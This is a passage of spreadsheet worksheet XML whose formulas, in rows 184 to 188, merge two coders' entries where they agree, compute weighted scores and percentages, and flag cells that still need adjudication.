        <f>IF(AND(Coder1!F184&amp;""&lt;&gt;"",Coder1!F184&amp;""=Coder2!F184&amp;""),Coder1!F184,"")</f>
        <v/>
      </c>
      <c r="G184" s="14">
        <f>IF(AND(Coder1!G184&amp;""&lt;&gt;"",Coder1!G184&amp;""=Coder2!G184&amp;""),Coder1!G184,"")</f>
        <v/>
      </c>
      <c r="H184" s="14">
        <f>IF(AND(Coder1!H184&amp;""&lt;&gt;"",Coder1!H184&amp;""=Coder2!H184&amp;""),Coder1!H184,"")</f>
        <v/>
      </c>
      <c r="I184" s="14">
        <f>IF(AND(Coder1!I184&amp;""&lt;&gt;"",Coder1!I184&amp;""=Coder2!I184&amp;""),Coder1!I184,"")</f>
        <v/>
      </c>
      <c r="J184" s="14">
        <f>IF(AND(Coder1!J184&amp;""&lt;&gt;"",Coder1!J184&amp;""=Coder2!J184&amp;""),Coder1!J184,"")</f>
        <v/>
      </c>
      <c r="K184" s="14">
        <f>IF(AND(Coder1!K184&amp;""&lt;&gt;"",Coder1!K184&amp;""=Coder2!K184&amp;""),Coder1!K184,"")</f>
        <v/>
      </c>
      <c r="L184" s="14">
        <f>IF(AND(Coder1!L184&amp;""&lt;&gt;"",Coder1!L184&amp;""=Coder2!L184&amp;""),Coder1!L184,"")</f>
        <v/>
      </c>
      <c r="M184" s="14">
        <f>IF(AND(Coder1!M184&amp;""&lt;&gt;"",Coder1!M184&amp;""=Coder2!M184&amp;""),Coder1!M184,"")</f>
        <v/>
      </c>
      <c r="N184" s="14">
        <f>IF(AND(Coder1!N184&amp;""&lt;&gt;"",Coder1!N184&amp;""=Coder2!N184&amp;""),Coder1!N184,"")</f>
        <v/>
      </c>
      <c r="O184" s="14">
        <f>IF(AND(Coder1!O184&amp;""&lt;&gt;"",Coder1!O184&amp;""=Coder2!O184&amp;""),Coder1!O184,"")</f>
        <v/>
      </c>
      <c r="P184" s="14">
        <f>IF(AND(Coder1!P184&amp;""&lt;&gt;"",Coder1!P184&amp;""=Coder2!P184&amp;""),Coder1!P184,"")</f>
        <v/>
      </c>
      <c r="Q184" s="14">
        <f>IF(AND(Coder1!Q184&amp;""&lt;&gt;"",Coder1!Q184&amp;""=Coder2!Q184&amp;""),Coder1!Q184,"")</f>
        <v/>
      </c>
      <c r="R184" s="14">
        <f>IF(AND(Coder1!R184&amp;""&lt;&gt;"",Coder1!R184&amp;""=Coder2!R184&amp;""),Coder1!R184,"")</f>
        <v/>
      </c>
      <c r="S184" s="14">
        <f>IF(AND(Coder1!S184&amp;""&lt;&gt;"",Coder1!S184&amp;""=Coder2!S184&amp;""),Coder1!S184,"")</f>
        <v/>
      </c>
      <c r="T184" s="14">
        <f>IF(AND(Coder1!T184&amp;""&lt;&gt;"",Coder1!T184&amp;""=Coder2!T184&amp;""),Coder1!T184,"")</f>
        <v/>
      </c>
      <c r="U184" s="14">
        <f>IF(AND(Coder1!U184&amp;""&lt;&gt;"",Coder1!U184&amp;""=Coder2!U184&amp;""),Coder1!U184,"")</f>
        <v/>
      </c>
      <c r="V184" s="14">
        <f>IF(AND(Coder1!V184&amp;""&lt;&gt;"",Coder1!V184&amp;""=Coder2!V184&amp;""),Coder1!V184,"")</f>
        <v/>
      </c>
      <c r="W184" s="14">
        <f>IF(AND(Coder1!W184&amp;""&lt;&gt;"",Coder1!W184&amp;""=Coder2!W184&amp;""),Coder1!W184,"")</f>
        <v/>
      </c>
      <c r="X184" s="14">
        <f>IF(AND(Coder1!X184&amp;""&lt;&gt;"",Coder1!X184&amp;""=Coder2!X184&amp;""),Coder1!X184,"")</f>
        <v/>
      </c>
      <c r="Y184" s="14">
        <f>IF(AND(Coder1!Y184&amp;""&lt;&gt;"",Coder1!Y184&amp;""=Coder2!Y184&amp;""),Coder1!Y184,"")</f>
        <v/>
      </c>
      <c r="Z184" s="14">
        <f>IF(AND(Coder1!Z184&amp;""&lt;&gt;"",Coder1!Z184&amp;""=Coder2!Z184&amp;""),Coder1!Z184,"")</f>
        <v/>
      </c>
      <c r="AA184" s="14">
        <f>IF(AND(Coder1!AA184&amp;""&lt;&gt;"",Coder1!AA184&amp;""=Coder2!AA184&amp;""),Coder1!AA184,"")</f>
        <v/>
      </c>
      <c r="AB184" s="14">
        <f>IF(AND(Coder1!AB184&amp;""&lt;&gt;"",Coder1!AB184&amp;""=Coder2!AB184&amp;""),Coder1!AB184,"")</f>
        <v/>
      </c>
      <c r="AC184" s="14">
        <f>IF(AND(Coder1!AC184&amp;""&lt;&gt;"",Coder1!AC184&amp;""=Coder2!AC184&amp;""),Coder1!AC184,"")</f>
        <v/>
      </c>
      <c r="AD184" s="14">
        <f>IF(AND(Coder1!AD184&amp;""&lt;&gt;"",Coder1!AD184&amp;""=Coder2!AD184&amp;""),Coder1!AD184,"")</f>
        <v/>
      </c>
      <c r="AE184" s="14">
        <f>IF(AND(Coder1!AE184&amp;""&lt;&gt;"",Coder1!AE184&amp;""=Coder2!AE184&amp;""),Coder1!AE184,"")</f>
        <v/>
      </c>
      <c r="AF184" s="14">
        <f>IF(AND(Coder1!AF184&amp;""&lt;&gt;"",Coder1!AF184&amp;""=Coder2!AF184&amp;""),Coder1!AF184,"")</f>
        <v/>
      </c>
      <c r="AG184" s="14">
        <f>IF(AND(Coder1!AG184&amp;""&lt;&gt;"",Coder1!AG184&amp;""=Coder2!AG184&amp;""),Coder1!AG184,"")</f>
        <v/>
      </c>
      <c r="AH184" s="14">
        <f>IF(AND(Coder1!AH184&amp;""&lt;&gt;"",Coder1!AH184&amp;""=Coder2!AH184&amp;""),Coder1!AH184,"")</f>
        <v/>
      </c>
      <c r="AI184" s="11">
        <f>IF(COUNT(E184:L184)=0,"",SUM(E184:L184))</f>
        <v/>
      </c>
      <c r="AJ184" s="11">
        <f>IF(AI184="","",N(E184)*3+N(F184)*2+N(G184)*2+N(H184)*2+N(I184)*2+N(J184)*3+N(K184)*3+N(L184)*3)</f>
        <v/>
      </c>
      <c r="AK184" s="11">
        <f>IF(AI184="","",COUNTIF(N184:AG184,1))</f>
        <v/>
      </c>
      <c r="AL184" s="11">
        <f>IF(OR(AJ184="",AJ184=0),"",ROUND(100*(AJ184-AK184)/AJ184,1))</f>
        <v/>
      </c>
      <c r="AM184" s="11">
        <f>IF(AND(Coder1!AN184=1,Coder2!AN184=1),IF(COUNTBLANK(E184:AH184)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN184" s="11">
        <f>IF(AND(Coder1!AN184=1,Coder2!AN184=1),IF(SUMPRODUCT(--(Coder1!E184:AH184&amp;""&lt;&gt;Coder2!E184:AH184&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO184" s="11" t="n"/>
    </row>
    <row r="185">
      <c r="A185" s="11">
        <f>Coder1!A185</f>
        <v/>
      </c>
      <c r="B185" s="11">
        <f>Coder1!B185</f>
        <v/>
      </c>
      <c r="C185" s="11">
        <f>Coder1!C185</f>
        <v/>
      </c>
      <c r="D185" s="11">
        <f>Coder1!D185</f>
        <v/>
      </c>
      <c r="E185" s="14">
        <f>IF(AND(Coder1!E185&amp;""&lt;&gt;"",Coder1!E185&amp;""=Coder2!E185&amp;""),Coder1!E185,"")</f>
        <v/>
      </c>
      <c r="F185" s="14">
        <f>IF(AND(Coder1!F185&amp;""&lt;&gt;"",Coder1!F185&amp;""=Coder2!F185&amp;""),Coder1!F185,"")</f>
        <v/>
      </c>
      <c r="G185" s="14">
        <f>IF(AND(Coder1!G185&amp;""&lt;&gt;"",Coder1!G185&amp;""=Coder2!G185&amp;""),Coder1!G185,"")</f>
        <v/>
      </c>
      <c r="H185" s="14">
        <f>IF(AND(Coder1!H185&amp;""&lt;&gt;"",Coder1!H185&amp;""=Coder2!H185&amp;""),Coder1!H185,"")</f>
        <v/>
      </c>
      <c r="I185" s="14">
        <f>IF(AND(Coder1!I185&amp;""&lt;&gt;"",Coder1!I185&amp;""=Coder2!I185&amp;""),Coder1!I185,"")</f>
        <v/>
      </c>
      <c r="J185" s="14">
        <f>IF(AND(Coder1!J185&amp;""&lt;&gt;"",Coder1!J185&amp;""=Coder2!J185&amp;""),Coder1!J185,"")</f>
        <v/>
      </c>
      <c r="K185" s="14">
        <f>IF(AND(Coder1!K185&amp;""&lt;&gt;"",Coder1!K185&amp;""=Coder2!K185&amp;""),Coder1!K185,"")</f>
        <v/>
      </c>
      <c r="L185" s="14">
        <f>IF(AND(Coder1!L185&amp;""&lt;&gt;"",Coder1!L185&amp;""=Coder2!L185&amp;""),Coder1!L185,"")</f>
        <v/>
      </c>
      <c r="M185" s="14">
        <f>IF(AND(Coder1!M185&amp;""&lt;&gt;"",Coder1!M185&amp;""=Coder2!M185&amp;""),Coder1!M185,"")</f>
        <v/>
      </c>
      <c r="N185" s="14">
        <f>IF(AND(Coder1!N185&amp;""&lt;&gt;"",Coder1!N185&amp;""=Coder2!N185&amp;""),Coder1!N185,"")</f>
        <v/>
      </c>
      <c r="O185" s="14">
        <f>IF(AND(Coder1!O185&amp;""&lt;&gt;"",Coder1!O185&amp;""=Coder2!O185&amp;""),Coder1!O185,"")</f>
        <v/>
      </c>
      <c r="P185" s="14">
        <f>IF(AND(Coder1!P185&amp;""&lt;&gt;"",Coder1!P185&amp;""=Coder2!P185&amp;""),Coder1!P185,"")</f>
        <v/>
      </c>
      <c r="Q185" s="14">
        <f>IF(AND(Coder1!Q185&amp;""&lt;&gt;"",Coder1!Q185&amp;""=Coder2!Q185&amp;""),Coder1!Q185,"")</f>
        <v/>
      </c>
      <c r="R185" s="14">
        <f>IF(AND(Coder1!R185&amp;""&lt;&gt;"",Coder1!R185&amp;""=Coder2!R185&amp;""),Coder1!R185,"")</f>
        <v/>
      </c>
      <c r="S185" s="14">
        <f>IF(AND(Coder1!S185&amp;""&lt;&gt;"",Coder1!S185&amp;""=Coder2!S185&amp;""),Coder1!S185,"")</f>
        <v/>
      </c>
      <c r="T185" s="14">
        <f>IF(AND(Coder1!T185&amp;""&lt;&gt;"",Coder1!T185&amp;""=Coder2!T185&amp;""),Coder1!T185,"")</f>
        <v/>
      </c>
      <c r="U185" s="14">
        <f>IF(AND(Coder1!U185&amp;""&lt;&gt;"",Coder1!U185&amp;""=Coder2!U185&amp;""),Coder1!U185,"")</f>
        <v/>
      </c>
      <c r="V185" s="14">
        <f>IF(AND(Coder1!V185&amp;""&lt;&gt;"",Coder1!V185&amp;""=Coder2!V185&amp;""),Coder1!V185,"")</f>
        <v/>
      </c>
      <c r="W185" s="14">
        <f>IF(AND(Coder1!W185&amp;""&lt;&gt;"",Coder1!W185&amp;""=Coder2!W185&amp;""),Coder1!W185,"")</f>
        <v/>
      </c>
      <c r="X185" s="14">
        <f>IF(AND(Coder1!X185&amp;""&lt;&gt;"",Coder1!X185&amp;""=Coder2!X185&amp;""),Coder1!X185,"")</f>
        <v/>
      </c>
      <c r="Y185" s="14">
        <f>IF(AND(Coder1!Y185&amp;""&lt;&gt;"",Coder1!Y185&amp;""=Coder2!Y185&amp;""),Coder1!Y185,"")</f>
        <v/>
      </c>
      <c r="Z185" s="14">
        <f>IF(AND(Coder1!Z185&amp;""&lt;&gt;"",Coder1!Z185&amp;""=Coder2!Z185&amp;""),Coder1!Z185,"")</f>
        <v/>
      </c>
      <c r="AA185" s="14">
        <f>IF(AND(Coder1!AA185&amp;""&lt;&gt;"",Coder1!AA185&amp;""=Coder2!AA185&amp;""),Coder1!AA185,"")</f>
        <v/>
      </c>
      <c r="AB185" s="14">
        <f>IF(AND(Coder1!AB185&amp;""&lt;&gt;"",Coder1!AB185&amp;""=Coder2!AB185&amp;""),Coder1!AB185,"")</f>
        <v/>
      </c>
      <c r="AC185" s="14">
        <f>IF(AND(Coder1!AC185&amp;""&lt;&gt;"",Coder1!AC185&amp;""=Coder2!AC185&amp;""),Coder1!AC185,"")</f>
        <v/>
      </c>
      <c r="AD185" s="14">
        <f>IF(AND(Coder1!AD185&amp;""&lt;&gt;"",Coder1!AD185&amp;""=Coder2!AD185&amp;""),Coder1!AD185,"")</f>
        <v/>
      </c>
      <c r="AE185" s="14">
        <f>IF(AND(Coder1!AE185&amp;""&lt;&gt;"",Coder1!AE185&amp;""=Coder2!AE185&amp;""),Coder1!AE185,"")</f>
        <v/>
      </c>
      <c r="AF185" s="14">
        <f>IF(AND(Coder1!AF185&amp;""&lt;&gt;"",Coder1!AF185&amp;""=Coder2!AF185&amp;""),Coder1!AF185,"")</f>
        <v/>
      </c>
      <c r="AG185" s="14">
        <f>IF(AND(Coder1!AG185&amp;""&lt;&gt;"",Coder1!AG185&amp;""=Coder2!AG185&amp;""),Coder1!AG185,"")</f>
        <v/>
      </c>
      <c r="AH185" s="14">
        <f>IF(AND(Coder1!AH185&amp;""&lt;&gt;"",Coder1!AH185&amp;""=Coder2!AH185&amp;""),Coder1!AH185,"")</f>
        <v/>
      </c>
      <c r="AI185" s="11">
        <f>IF(COUNT(E185:L185)=0,"",SUM(E185:L185))</f>
        <v/>
      </c>
      <c r="AJ185" s="11">
        <f>IF(AI185="","",N(E185)*3+N(F185)*2+N(G185)*2+N(H185)*2+N(I185)*2+N(J185)*3+N(K185)*3+N(L185)*3)</f>
        <v/>
      </c>
      <c r="AK185" s="11">
        <f>IF(AI185="","",COUNTIF(N185:AG185,1))</f>
        <v/>
      </c>
      <c r="AL185" s="11">
        <f>IF(OR(AJ185="",AJ185=0),"",ROUND(100*(AJ185-AK185)/AJ185,1))</f>
        <v/>
      </c>
      <c r="AM185" s="11">
        <f>IF(AND(Coder1!AN185=1,Coder2!AN185=1),IF(COUNTBLANK(E185:AH185)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN185" s="11">
        <f>IF(AND(Coder1!AN185=1,Coder2!AN185=1),IF(SUMPRODUCT(--(Coder1!E185:AH185&amp;""&lt;&gt;Coder2!E185:AH185&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO185" s="11" t="n"/>
    </row>
    <row r="186">
      <c r="A186" s="11">
        <f>Coder1!A186</f>
        <v/>
      </c>
      <c r="B186" s="11">
        <f>Coder1!B186</f>
        <v/>
      </c>
      <c r="C186" s="11">
        <f>Coder1!C186</f>
        <v/>
      </c>
      <c r="D186" s="11">
        <f>Coder1!D186</f>
        <v/>
      </c>
      <c r="E186" s="14">
        <f>IF(AND(Coder1!E186&amp;""&lt;&gt;"",Coder1!E186&amp;""=Coder2!E186&amp;""),Coder1!E186,"")</f>
        <v/>
      </c>
      <c r="F186" s="14">
        <f>IF(AND(Coder1!F186&amp;""&lt;&gt;"",Coder1!F186&amp;""=Coder2!F186&amp;""),Coder1!F186,"")</f>
        <v/>
      </c>
      <c r="G186" s="14">
        <f>IF(AND(Coder1!G186&amp;""&lt;&gt;"",Coder1!G186&amp;""=Coder2!G186&amp;""),Coder1!G186,"")</f>
        <v/>
      </c>
      <c r="H186" s="14">
        <f>IF(AND(Coder1!H186&amp;""&lt;&gt;"",Coder1!H186&amp;""=Coder2!H186&amp;""),Coder1!H186,"")</f>
        <v/>
      </c>
      <c r="I186" s="14">
        <f>IF(AND(Coder1!I186&amp;""&lt;&gt;"",Coder1!I186&amp;""=Coder2!I186&amp;""),Coder1!I186,"")</f>
        <v/>
      </c>
      <c r="J186" s="14">
        <f>IF(AND(Coder1!J186&amp;""&lt;&gt;"",Coder1!J186&amp;""=Coder2!J186&amp;""),Coder1!J186,"")</f>
        <v/>
      </c>
      <c r="K186" s="14">
        <f>IF(AND(Coder1!K186&amp;""&lt;&gt;"",Coder1!K186&amp;""=Coder2!K186&amp;""),Coder1!K186,"")</f>
        <v/>
      </c>
      <c r="L186" s="14">
        <f>IF(AND(Coder1!L186&amp;""&lt;&gt;"",Coder1!L186&amp;""=Coder2!L186&amp;""),Coder1!L186,"")</f>
        <v/>
      </c>
      <c r="M186" s="14">
        <f>IF(AND(Coder1!M186&amp;""&lt;&gt;"",Coder1!M186&amp;""=Coder2!M186&amp;""),Coder1!M186,"")</f>
        <v/>
      </c>
      <c r="N186" s="14">
        <f>IF(AND(Coder1!N186&amp;""&lt;&gt;"",Coder1!N186&amp;""=Coder2!N186&amp;""),Coder1!N186,"")</f>
        <v/>
      </c>
      <c r="O186" s="14">
        <f>IF(AND(Coder1!O186&amp;""&lt;&gt;"",Coder1!O186&amp;""=Coder2!O186&amp;""),Coder1!O186,"")</f>
        <v/>
      </c>
      <c r="P186" s="14">
        <f>IF(AND(Coder1!P186&amp;""&lt;&gt;"",Coder1!P186&amp;""=Coder2!P186&amp;""),Coder1!P186,"")</f>
        <v/>
      </c>
      <c r="Q186" s="14">
        <f>IF(AND(Coder1!Q186&amp;""&lt;&gt;"",Coder1!Q186&amp;""=Coder2!Q186&amp;""),Coder1!Q186,"")</f>
        <v/>
      </c>
      <c r="R186" s="14">
        <f>IF(AND(Coder1!R186&amp;""&lt;&gt;"",Coder1!R186&amp;""=Coder2!R186&amp;""),Coder1!R186,"")</f>
        <v/>
      </c>
      <c r="S186" s="14">
        <f>IF(AND(Coder1!S186&amp;""&lt;&gt;"",Coder1!S186&amp;""=Coder2!S186&amp;""),Coder1!S186,"")</f>
        <v/>
      </c>
      <c r="T186" s="14">
        <f>IF(AND(Coder1!T186&amp;""&lt;&gt;"",Coder1!T186&amp;""=Coder2!T186&amp;""),Coder1!T186,"")</f>
        <v/>
      </c>
      <c r="U186" s="14">
        <f>IF(AND(Coder1!U186&amp;""&lt;&gt;"",Coder1!U186&amp;""=Coder2!U186&amp;""),Coder1!U186,"")</f>
        <v/>
      </c>
      <c r="V186" s="14">
        <f>IF(AND(Coder1!V186&amp;""&lt;&gt;"",Coder1!V186&amp;""=Coder2!V186&amp;""),Coder1!V186,"")</f>
        <v/>
      </c>
      <c r="W186" s="14">
        <f>IF(AND(Coder1!W186&amp;""&lt;&gt;"",Coder1!W186&amp;""=Coder2!W186&amp;""),Coder1!W186,"")</f>
        <v/>
      </c>
      <c r="X186" s="14">
        <f>IF(AND(Coder1!X186&amp;""&lt;&gt;"",Coder1!X186&amp;""=Coder2!X186&amp;""),Coder1!X186,"")</f>
        <v/>
      </c>
      <c r="Y186" s="14">
        <f>IF(AND(Coder1!Y186&amp;""&lt;&gt;"",Coder1!Y186&amp;""=Coder2!Y186&amp;""),Coder1!Y186,"")</f>
        <v/>
      </c>
      <c r="Z186" s="14">
        <f>IF(AND(Coder1!Z186&amp;""&lt;&gt;"",Coder1!Z186&amp;""=Coder2!Z186&amp;""),Coder1!Z186,"")</f>
        <v/>
      </c>
      <c r="AA186" s="14">
        <f>IF(AND(Coder1!AA186&amp;""&lt;&gt;"",Coder1!AA186&amp;""=Coder2!AA186&amp;""),Coder1!AA186,"")</f>
        <v/>
      </c>
      <c r="AB186" s="14">
        <f>IF(AND(Coder1!AB186&amp;""&lt;&gt;"",Coder1!AB186&amp;""=Coder2!AB186&amp;""),Coder1!AB186,"")</f>
        <v/>
      </c>
      <c r="AC186" s="14">
        <f>IF(AND(Coder1!AC186&amp;""&lt;&gt;"",Coder1!AC186&amp;""=Coder2!AC186&amp;""),Coder1!AC186,"")</f>
        <v/>
      </c>
      <c r="AD186" s="14">
        <f>IF(AND(Coder1!AD186&amp;""&lt;&gt;"",Coder1!AD186&amp;""=Coder2!AD186&amp;""),Coder1!AD186,"")</f>
        <v/>
      </c>
      <c r="AE186" s="14">
        <f>IF(AND(Coder1!AE186&amp;""&lt;&gt;"",Coder1!AE186&amp;""=Coder2!AE186&amp;""),Coder1!AE186,"")</f>
        <v/>
      </c>
      <c r="AF186" s="14">
        <f>IF(AND(Coder1!AF186&amp;""&lt;&gt;"",Coder1!AF186&amp;""=Coder2!AF186&amp;""),Coder1!AF186,"")</f>
        <v/>
      </c>
      <c r="AG186" s="14">
        <f>IF(AND(Coder1!AG186&amp;""&lt;&gt;"",Coder1!AG186&amp;""=Coder2!AG186&amp;""),Coder1!AG186,"")</f>
        <v/>
      </c>
      <c r="AH186" s="14">
        <f>IF(AND(Coder1!AH186&amp;""&lt;&gt;"",Coder1!AH186&amp;""=Coder2!AH186&amp;""),Coder1!AH186,"")</f>
        <v/>
      </c>
      <c r="AI186" s="11">
        <f>IF(COUNT(E186:L186)=0,"",SUM(E186:L186))</f>
        <v/>
      </c>
      <c r="AJ186" s="11">
        <f>IF(AI186="","",N(E186)*3+N(F186)*2+N(G186)*2+N(H186)*2+N(I186)*2+N(J186)*3+N(K186)*3+N(L186)*3)</f>
        <v/>
      </c>
      <c r="AK186" s="11">
        <f>IF(AI186="","",COUNTIF(N186:AG186,1))</f>
        <v/>
      </c>
      <c r="AL186" s="11">
        <f>IF(OR(AJ186="",AJ186=0),"",ROUND(100*(AJ186-AK186)/AJ186,1))</f>
        <v/>
      </c>
      <c r="AM186" s="11">
        <f>IF(AND(Coder1!AN186=1,Coder2!AN186=1),IF(COUNTBLANK(E186:AH186)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN186" s="11">
        <f>IF(AND(Coder1!AN186=1,Coder2!AN186=1),IF(SUMPRODUCT(--(Coder1!E186:AH186&amp;""&lt;&gt;Coder2!E186:AH186&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO186" s="11" t="n"/>
    </row>
    <row r="187">
      <c r="A187" s="11">
        <f>Coder1!A187</f>
        <v/>
      </c>
      <c r="B187" s="11">
        <f>Coder1!B187</f>
        <v/>
      </c>
      <c r="C187" s="11">
        <f>Coder1!C187</f>
        <v/>
      </c>
      <c r="D187" s="11">
        <f>Coder1!D187</f>
        <v/>
      </c>
      <c r="E187" s="14">
        <f>IF(AND(Coder1!E187&amp;""&lt;&gt;"",Coder1!E187&amp;""=Coder2!E187&amp;""),Coder1!E187,"")</f>
        <v/>
      </c>
      <c r="F187" s="14">
        <f>IF(AND(Coder1!F187&amp;""&lt;&gt;"",Coder1!F187&amp;""=Coder2!F187&amp;""),Coder1!F187,"")</f>
        <v/>
      </c>
      <c r="G187" s="14">
        <f>IF(AND(Coder1!G187&amp;""&lt;&gt;"",Coder1!G187&amp;""=Coder2!G187&amp;""),Coder1!G187,"")</f>
        <v/>
      </c>
      <c r="H187" s="14">
        <f>IF(AND(Coder1!H187&amp;""&lt;&gt;"",Coder1!H187&amp;""=Coder2!H187&amp;""),Coder1!H187,"")</f>
        <v/>
      </c>
      <c r="I187" s="14">
        <f>IF(AND(Coder1!I187&amp;""&lt;&gt;"",Coder1!I187&amp;""=Coder2!I187&amp;""),Coder1!I187,"")</f>
        <v/>
      </c>
      <c r="J187" s="14">
        <f>IF(AND(Coder1!J187&amp;""&lt;&gt;"",Coder1!J187&amp;""=Coder2!J187&amp;""),Coder1!J187,"")</f>
        <v/>
      </c>
      <c r="K187" s="14">
        <f>IF(AND(Coder1!K187&amp;""&lt;&gt;"",Coder1!K187&amp;""=Coder2!K187&amp;""),Coder1!K187,"")</f>
        <v/>
      </c>
      <c r="L187" s="14">
        <f>IF(AND(Coder1!L187&amp;""&lt;&gt;"",Coder1!L187&amp;""=Coder2!L187&amp;""),Coder1!L187,"")</f>
        <v/>
      </c>
      <c r="M187" s="14">
        <f>IF(AND(Coder1!M187&amp;""&lt;&gt;"",Coder1!M187&amp;""=Coder2!M187&amp;""),Coder1!M187,"")</f>
        <v/>
      </c>
      <c r="N187" s="14">
        <f>IF(AND(Coder1!N187&amp;""&lt;&gt;"",Coder1!N187&amp;""=Coder2!N187&amp;""),Coder1!N187,"")</f>
        <v/>
      </c>
      <c r="O187" s="14">
        <f>IF(AND(Coder1!O187&amp;""&lt;&gt;"",Coder1!O187&amp;""=Coder2!O187&amp;""),Coder1!O187,"")</f>
        <v/>
      </c>
      <c r="P187" s="14">
        <f>IF(AND(Coder1!P187&amp;""&lt;&gt;"",Coder1!P187&amp;""=Coder2!P187&amp;""),Coder1!P187,"")</f>
        <v/>
      </c>
      <c r="Q187" s="14">
        <f>IF(AND(Coder1!Q187&amp;""&lt;&gt;"",Coder1!Q187&amp;""=Coder2!Q187&amp;""),Coder1!Q187,"")</f>
        <v/>
      </c>
      <c r="R187" s="14">
        <f>IF(AND(Coder1!R187&amp;""&lt;&gt;"",Coder1!R187&amp;""=Coder2!R187&amp;""),Coder1!R187,"")</f>
        <v/>
      </c>
      <c r="S187" s="14">
        <f>IF(AND(Coder1!S187&amp;""&lt;&gt;"",Coder1!S187&amp;""=Coder2!S187&amp;""),Coder1!S187,"")</f>
        <v/>
      </c>
      <c r="T187" s="14">
        <f>IF(AND(Coder1!T187&amp;""&lt;&gt;"",Coder1!T187&amp;""=Coder2!T187&amp;""),Coder1!T187,"")</f>
        <v/>
      </c>
      <c r="U187" s="14">
        <f>IF(AND(Coder1!U187&amp;""&lt;&gt;"",Coder1!U187&amp;""=Coder2!U187&amp;""),Coder1!U187,"")</f>
        <v/>
      </c>
      <c r="V187" s="14">
        <f>IF(AND(Coder1!V187&amp;""&lt;&gt;"",Coder1!V187&amp;""=Coder2!V187&amp;""),Coder1!V187,"")</f>
        <v/>
      </c>
      <c r="W187" s="14">
        <f>IF(AND(Coder1!W187&amp;""&lt;&gt;"",Coder1!W187&amp;""=Coder2!W187&amp;""),Coder1!W187,"")</f>
        <v/>
      </c>
      <c r="X187" s="14">
        <f>IF(AND(Coder1!X187&amp;""&lt;&gt;"",Coder1!X187&amp;""=Coder2!X187&amp;""),Coder1!X187,"")</f>
        <v/>
      </c>
      <c r="Y187" s="14">
        <f>IF(AND(Coder1!Y187&amp;""&lt;&gt;"",Coder1!Y187&amp;""=Coder2!Y187&amp;""),Coder1!Y187,"")</f>
        <v/>
      </c>
      <c r="Z187" s="14">
        <f>IF(AND(Coder1!Z187&amp;""&lt;&gt;"",Coder1!Z187&amp;""=Coder2!Z187&amp;""),Coder1!Z187,"")</f>
        <v/>
      </c>
      <c r="AA187" s="14">
        <f>IF(AND(Coder1!AA187&amp;""&lt;&gt;"",Coder1!AA187&amp;""=Coder2!AA187&amp;""),Coder1!AA187,"")</f>
        <v/>
      </c>
      <c r="AB187" s="14">
        <f>IF(AND(Coder1!AB187&amp;""&lt;&gt;"",Coder1!AB187&amp;""=Coder2!AB187&amp;""),Coder1!AB187,"")</f>
        <v/>
      </c>
      <c r="AC187" s="14">
        <f>IF(AND(Coder1!AC187&amp;""&lt;&gt;"",Coder1!AC187&amp;""=Coder2!AC187&amp;""),Coder1!AC187,"")</f>
        <v/>
      </c>
      <c r="AD187" s="14">
        <f>IF(AND(Coder1!AD187&amp;""&lt;&gt;"",Coder1!AD187&amp;""=Coder2!AD187&amp;""),Coder1!AD187,"")</f>
        <v/>
      </c>
      <c r="AE187" s="14">
        <f>IF(AND(Coder1!AE187&amp;""&lt;&gt;"",Coder1!AE187&amp;""=Coder2!AE187&amp;""),Coder1!AE187,"")</f>
        <v/>
      </c>
      <c r="AF187" s="14">
        <f>IF(AND(Coder1!AF187&amp;""&lt;&gt;"",Coder1!AF187&amp;""=Coder2!AF187&amp;""),Coder1!AF187,"")</f>
        <v/>
      </c>
      <c r="AG187" s="14">
        <f>IF(AND(Coder1!AG187&amp;""&lt;&gt;"",Coder1!AG187&amp;""=Coder2!AG187&amp;""),Coder1!AG187,"")</f>
        <v/>
      </c>
      <c r="AH187" s="14">
        <f>IF(AND(Coder1!AH187&amp;""&lt;&gt;"",Coder1!AH187&amp;""=Coder2!AH187&amp;""),Coder1!AH187,"")</f>
        <v/>
      </c>
      <c r="AI187" s="11">
        <f>IF(COUNT(E187:L187)=0,"",SUM(E187:L187))</f>
        <v/>
      </c>
      <c r="AJ187" s="11">
        <f>IF(AI187="","",N(E187)*3+N(F187)*2+N(G187)*2+N(H187)*2+N(I187)*2+N(J187)*3+N(K187)*3+N(L187)*3)</f>
        <v/>
      </c>
      <c r="AK187" s="11">
        <f>IF(AI187="","",COUNTIF(N187:AG187,1))</f>
        <v/>
      </c>
      <c r="AL187" s="11">
        <f>IF(OR(AJ187="",AJ187=0),"",ROUND(100*(AJ187-AK187)/AJ187,1))</f>
        <v/>
      </c>
      <c r="AM187" s="11">
        <f>IF(AND(Coder1!AN187=1,Coder2!AN187=1),IF(COUNTBLANK(E187:AH187)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN187" s="11">
        <f>IF(AND(Coder1!AN187=1,Coder2!AN187=1),IF(SUMPRODUCT(--(Coder1!E187:AH187&amp;""&lt;&gt;Coder2!E187:AH187&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO187" s="11" t="n"/>
    </row>
    <row r="188">
      <c r="A188" s="11">
        <f>Coder1!A188</f>
        <v/>
      </c>
      <c r="B188" s="11">
        <f>Coder1!B188</f>
        <v/>
      </c>
      <c r="C188" s="11">
        <f>Coder1!C188</f>
        <v/>
      </c>
      <c r="D188" s="11">
        <f>Coder1!D188</f>
        <v/>
      </c>
      <c r="E188" s="14">
        <f>IF(AND(Coder1!E188&amp;""&lt;&gt;"",Coder1!E188&amp;""=Coder2!E188&amp;""),Coder1!E188,"")</f>
        <v/>
      </c>
      <c r="F188" s="14">
        <f>IF(AND(Coder1!F188&amp;""&lt;&gt;"",Coder1!F188&amp;""=Coder2!F188&amp;""),Coder1!F188,"")</f>
        <v/>
      </c>
      <c r="G188" s="14">
        <f>IF(AND(Coder1!G188&amp;""&lt;&gt;"",Coder1!G188&amp;""=Coder2!G188&amp;""),Coder1!G188,"")</f>
        <v/>
      </c>
      <c r="H188" s="14">
        <f>IF(AND(Coder1!H188&amp;""&lt;&gt;"",Coder1!H188&amp;""=Coder2!H188&amp;""),Coder1!H188,"")</f>
        <v/>
      </c>
      <c r="I188" s="14">
